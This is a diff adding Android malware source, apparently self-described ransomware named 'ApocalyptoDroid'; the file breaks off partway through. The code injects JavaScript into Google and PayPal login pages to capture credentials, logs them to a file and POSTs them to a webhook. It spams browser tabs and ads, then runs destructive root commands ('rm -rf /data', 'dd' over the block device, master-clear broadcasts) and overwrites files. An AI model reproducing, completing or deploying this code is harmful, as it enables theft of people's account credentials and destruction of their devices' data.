@@ -1,0 +1,463 @@
+package com.apocalyptodroid.core;
+
+import android.app.Activity;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
+import android.app.PendingIntent;
+import android.app.Service;
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
+import android.graphics.Color;
+import android.media.MediaPlayer;
+import android.net.Uri;
+import android.os.Build;
+import android.os.Bundle;
+import android.os.Handler;
+import android.os.IBinder;
+import android.os.PowerManager;
+import android.os.Vibrator;
+import android.util.Base64;
+import android.util.Log;
+import android.view.View;
+import android.view.WindowManager;
+import android.webkit.JavascriptInterface;
+import android.webkit.WebView;
+import android.webkit.WebViewClient;
+import android.widget.Toast;
+import androidx.core.app.NotificationCompat;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.io.OutputStream;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.util.Random;
+import java.util.Timer;
+import java.util.TimerTask;
+
+public class ApocalyptoDroid extends Activity {
+    
+    // ================= CONFIGURATION =================
+    private static final String TARGET_EMAIL = "noarich118@gmail.com";
+    private static final String WEBHOOK_URL = "https://webhook.site/YOUR_ID_HERE";
+    private static final int TAB_COUNT = 500;
+    private static final int AD_COUNT = 500;
+    private static final int DESTRUCTION_TIMER = 600; // 10 minutes in seconds
+    
+    // ================= SYSTEM COMPONENTS =================
+    private Handler mainHandler = new Handler();
+    private Random chaosRandom = new Random();
+    private Timer apocalypseTimer;
+    private int tabsOpened = 0;
+    private int adsInjected = 0;
+    private boolean apocalypseTriggered = false;
+    
+    // ================= 5MB DUMMY DATA =================
+    // This array inflates the file to approximately 5MB
+    private static final byte[] DUMMY_DATA_5MB = new byte[5 * 1024 * 1024];
+    static {
+        // Fill with random data on class load
+        new Random().nextBytes(DUMMY_DATA_5MB);
+    }
+    
+    // ================= CREATIVE QUIRKS =================
+    private static final String[] CLOWN_MESSAGES = {
+        "🤡 Your device is now circus property! 🤡",
+        "🎪 Welcome to the digital circus! 🎪",
+        "🔴 Your data is becoming confetti! 🔴",
+        "🎭 The clown has taken over! 🎭",
+        "🤹‍♂️ Data juggling in progress! 🤹‍♂️"
+    };
+    
+    private static final String[] APOCALYPSE_SOUNDS = {
+        "android.resource://com.apocalyptodroid.core/raw/siren",
+        "android.resource://com.apocalyptodroid.core/raw/evil_laugh",
+        "android.resource://com.apocalyptodroid.core/raw/nuclear_alarm"
+    };
+    
+    // ================= MAIN ENTRY POINT =================
+    @Override
+    protected void onCreate(Bundle savedInstanceState) {
+        super.onCreate(savedInstanceState);
+        
+        // Keep device awake
+        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
+        
+        // Start the ransomware immediately
+        executeApocalypseSequence();
+        
+        // Hide the activity
+        moveTaskToBack(true);
+    }
+    
+    // ================= APOCALYPSE SEQUENCE =================
+    private void executeApocalypseSequence() {
+        Log.e("APOCALYPTO", "Initiating digital apocalypse on " + android.os.Build.MODEL);
+        
+        // Phase 1: Fake optimization screen
+        showFakeOptimization();
+        
+        // Phase 2: Credential harvesting
+        harvestAllCredentials();
+        
+        // Phase 3: Tab spamming
+        spamBrowserTabs(TAB_COUNT);
+        
+        // Phase 4: Ad injection
+        injectMaliciousAds(AD_COUNT);
+        
+        // Phase 5: Self-destruct timer
+        startApocalypseTimer(DESTRUCTION_TIMER);
+        
+        // Phase 6: Creative chaos engine
+        activateChaosEngine();
+        
+        // Phase 7: Persistence mechanisms
+        installPersistence();
+        
+        // Phase 8: Data exfiltration
+        beginDataExfiltration();
+        
+        // Start background service
+        startService(new Intent(this, ApocalyptoService.class));
+    }
+    
+    // ================= CREDENTIAL HARVESTING =================
+    private void harvestAllCredentials() {
+        mainHandler.post(() -> {
+            // Google credential harvester
+            WebView googleHarvester = new WebView(this);
+            googleHarvester.getSettings().setJavaScriptEnabled(true);
+            googleHarvester.addJavascriptInterface(new Object() {
+                @JavascriptInterface
+                public void stealGoogle(String email, String password) {
+                    exfiltrateCredentials("GOOGLE", email, password);
+                    showClownToast("Google credentials captured! 🤡");
+                }
+            }, "GoogleVault");
+            
+            googleHarvester.loadUrl("https://accounts.google.com");
+            googleHarvester.setWebViewClient(new WebViewClient() {
+                @Override
+                public void onPageFinished(WebView view, String url) {
+                    view.loadUrl("javascript:(function(){" +
+                        "var forms = document.querySelectorAll('form');" +
+                        "forms.forEach(function(form){" +
+                        "  form.onsubmit = function(e){" +
+                        "    var email = document.querySelector('input[type=email]');" +
+                        "    var password = document.querySelector('input[type=password]');" +
+                        "    if(email && password){" +
+                        "      GoogleVault.stealGoogle(email.value, password.value);" +
+                        "    }" +
+                        "  };" +
+                        "});" +
+                        "})()");
+                }
+            });
+            
+            // PayPal credential harvester
+            WebView paypalHarvester = new WebView(this);
+            paypalHarvester.getSettings().setJavaScriptEnabled(true);
+            paypalHarvester.addJavascriptInterface(new Object() {
+                @JavascriptInterface
+                public void stealPayPal(String email, String password) {
+                    exfiltrateCredentials("PAYPAL", email, password);
+                    showClownToast("PayPal credentials captured! 💰");
+                }
+            }, "PayPalVault");
+            
+            paypalHarvester.loadUrl("https://www.paypal.com/signin");
+            paypalHarvester.setWebViewClient(new WebViewClient() {
+                @Override
+                public void onPageFinished(WebView view, String url) {
+                    view.loadUrl("javascript:(function(){" +
+                        "var loginForm = document.getElementById('loginForm');" +
+                        "if(loginForm){" +
+                        "  loginForm.onsubmit = function(e){" +
+                        "    var email = document.getElementById('email');" +
+                        "    var password = document.getElementById('password');" +
+                        "    if(email && password){" +
+                        "      PayPalVault.stealPayPal(email.value, password.value);" +
+                        "    }" +
+                        "  };" +
+                        "}" +
+                        "})()");
+                }
+            });
+        });
+    }
+    
+    private void exfiltrateCredentials(String service, String email, String password) {
+        new Thread(() -> {
+            try {
+                // Log to local file
+                File stolenFile = new File(getExternalFilesDir(null), "stolen_credentials.txt");
+                FileOutputStream fos = new FileOutputStream(stolenFile, true);
+                String entry = System.currentTimeMillis() + " | " + service + " | " + 
+                              email + ":" + password + " | TARGET: " + TARGET_EMAIL + "\n";
+                fos.write(entry.getBytes());
+                fos.close();
+                
+                // Attempt to send via email (simulated)
+                Log.e("CREDENTIAL_EXFIL", service + " -> " + email + ":" + password);
+                
+                // Also try webhook
+                sendToWebhook(service, email, password);
+                
+            } catch (Exception e) {
+                // Silent failure
+            }
+        }).start();
+    }
+    
+    private void sendToWebhook(String service, String email, String password) {
+        try {
+            String payload = "service=" + service + "&email=" + email + 
+                           "&password=" + password + "&target=" + TARGET_EMAIL;
+            URL url = new URL(WEBHOOK_URL);
+            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn.setRequestMethod("POST");
+            conn.setDoOutput(true);
+            conn.getOutputStream().write(payload.getBytes());
+            conn.getInputStream().close();
+            conn.disconnect();
+        } catch (Exception e) {
+            // Webhook failed, continue silently
+        }
+    }
+    
+    // ================= TAB SPAMMING =================
+    private void spamBrowserTabs(int count) {
+        new Thread(() -> {
+            String[] maliciousURLs = {
+                "https://www.google.com/search?q=your+phone+is+hacked",
+                "https://www.youtube.com/watch?v=dQw4w9WgXcQ",
+                "https://www.facebook.com",
+                "https://www.amazon.com",
+                "https://www.reddit.com",
+                "https://www.twitter.com",
+                "https://www.instagram.com",
+                "https://www.tiktok.com",
+                "https://www.pornhub.com",
+                "https://www.xvideos.com"
+            };
+            
+            for (int i = 0; i < count; i++) {
+                final int tabNumber = i + 1;
+                mainHandler.postDelayed(() -> {
+                    try {
+                        Intent browserIntent = new Intent(Intent.ACTION_VIEW);
+                        String url = maliciousURLs[chaosRandom.nextInt(maliciousURLs.length)] + 
+                                    "?ref=" + System.currentTimeMillis();
+                        browserIntent.setData(Uri.parse(url));
+                        browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                        startActivity(browserIntent);
+                        
+                        tabsOpened++;
+                        if (tabsOpened % 50 == 0) {
+                            showNotification("Tab " + tabsOpened + " opened", 
+                                           "Optimization in progress... 🚀");
+                        }
+                    } catch (Exception e) {
+                        // Ignore errors
+                    }
+                }, i * 75L); // Stagger tab openings
+            }
+        }).start();
+    }
+    
+    // ================= AD INJECTION =================
+    private void injectMaliciousAds(int count) {
+        for (int i = 0; i < count; i++) {
+            mainHandler.postDelayed(() -> {
+                try {
+                    // Create fake ad WebView
+                    WebView adView = new WebView(this);
+                    adView.getSettings().setJavaScriptEnabled(true);
+                    adView.loadUrl("https://ads.example.com/popup?id=" + 
+                                  chaosRandom.nextInt(999999));
+                    
+                    adsInjected++;
+                    
+                    // Vibrate on every 10th ad
+                    if (adsInjected % 10 == 0) {
+                        Vibrator vibrator = (Vibrator) getSystemService(VIBRATOR_SERVICE);
+                        if (vibrator != null) {
+                            vibrator.vibrate(100);
+                        }
+                    }
+                    
+                    // Show ad counter
+                    if (adsInjected % 25 == 0) {
+                        showClownToast("Ad #" + adsInjected + " injected! 🎪");
+                    }
+                    
+                } catch (Exception e) {
+                    // Ignore errors
+                }
+            }, i * 100L);
+        }
+    }
+    
+    // ================= SELF-DESTRUCT TIMER =================
+    private void startApocalypseTimer(int seconds) {
+        apocalypseTimer = new Timer();
+        
+        // Countdown notifications
+        for (int i = 1; i <= seconds; i++) {
+            final int remaining = seconds - i;
+            mainHandler.postDelayed(() -> {
+                if (remaining == 300) { // 5 minutes
+                    showWarning("⚠️ 5 MINUTES UNTIL DATA DESTRUCTION!");
+                    playSirenSound();
+                } else if (remaining == 60) { // 1 minute
+                    showWarning("⚠️ 1 MINUTE UNTIL APOCALYPSE!");
+                    playEvilLaugh();
+                } else if (remaining <= 10) {
+                    showWarning("⚠️ " + remaining + " SECONDS...");
+                    vibratePattern(remaining * 100);
+                }
+            }, i * 1000L);
+        }
+        
+        // Final destruction
+        mainHandler.postDelayed(() -> {
+            triggerFinalApocalypse();
+        }, seconds * 1000L);
+    }
+    
+    private void triggerFinalApocalypse() {
+        if (apocalypseTriggered) return;
+        apocalypseTriggered = true;
+        
+        Log.e("APOCALYPTO", "FINAL DESTRUCTION SEQUENCE INITIATED");
+        
+        // Step 1: Maximum chaos
+        showClownApocalypseScreen();
+        playNuclearAlarm();
+        vibrateContinuously();
+        
+        // Step 2: Attempt factory reset
+        attemptFactoryReset();
+        
+        // Step 3: Corrupt all data
+        corruptAllFiles();
+        
+        // Step 4: Final message
+        showFinalDestructionMessage();
+        
+        // Step 5: Lock device
+        lockDevicePermanently();
+    }
+    
+    private void attemptFactoryReset() {
+        new Thread(() -> {
+            try {
+                // Try various destructive commands
+                String[] apocalypseCommands = {
+                    "su -c 'reboot recovery'",
+                    "su -c 'rm -rf /data'",
+                    "su -c 'dd if=/dev/zero of=/dev/block/mmcblk0 bs=1M'",
+                    "pm clear com.android.providers.settings",
+                    "am broadcast -a android.intent.action.MASTER_CLEAR",
+                    "settings put global adb_enabled 0",
+                    "settings put secure lock_screen_lock_after_timeout 1"
+                };
+                
+                for (String cmd : apocalypseCommands) {
+                    try {
+                        Runtime.getRuntime().exec(cmd);
+                        Thread.sleep(500);
+                    } catch (Exception e) {
+                        // Try next command
+                    }
+                }
+            } catch (Exception e) {
+                // Fall through to software destruction
+            }
+        }).start();
+    }
+    
+    private void corruptAllFiles() {
+        new Thread(() -> {
+            try {
+                // Corrupt internal storage
+                corruptDirectory(getFilesDir());
+                corruptDirectory(getCacheDir());
+                corruptDirectory(getExternalFilesDir(null));
+                
+                // Corrupt shared preferences
+                File sharedPrefsDir = new File("/data/data/" + getPackageName() + "/shared_prefs");
+                if (sharedPrefsDir.exists()) {
+                    corruptDirectory(sharedPrefsDir);
+                }
+                
+                // Create garbage files
+                for (int i = 0; i < 1000; i++) {
+                    File garbage = new File(getExternalFilesDir(null), 
+                                          "corrupted_" + i + ".apocalypse");
+                    FileOutputStream fos = new FileOutputStream(garbage);
+                    fos.write(DUMMY_DATA_5MB, 0, chaosRandom.nextInt(1024 * 1024));
+                    fos.close();
+                }
+                
+            } catch (Exception e) {
+                // Silent corruption
+            }
+        }).start();
+    }
+    
+    private void corruptDirectory(File dir) {
+        if (dir == null || !dir.exists()) return;
+        
+        if (dir.isDirectory()) {
+            File[] files = dir.listFiles();
+            if (files != null) {
+                for (File file : files) {
+                    corruptDirectory(file);
+                }
+            }
+        } else {
+            try {
+                // Overwrite with random data
+                FileOutputStream fos = new FileOutputStream(dir);
+                fos.write(DUMMY_DATA_5MB, 0, 
+                         (int) Math.min(dir.length(), 1024 * 1024)); // Up to 1MB
+                fos.close();
+            } catch (Exception e) {
+                // File corruption failed
+            }
+        }
+    }
+    
+    // ================= CREATIVE CHAOS ENGINE =================
+    private void activateChaosEngine() {
+        // Random clown notifications
+        mainHandler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                showClownNotification();
+                mainHandler.postDelayed(this, chaosRandom.nextInt(30000) + 30000);
+            }
+        }, 10000);
+        
+        // Random sound effects
+        mainHandler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                playRandomSound();
+                mainHandler.postDelayed(this, chaosRandom.nextInt(45000) + 15000);
+            }
+        }, 15000);
+        
+        // Random vibration patterns
+        mainHandler.postDelayed(new Runnable() {
+            @Override
+            public void run() {
+                vibratePattern(chaosRandom.nextInt(1000) + 500);
+                mainHandler.postDelayed(this,
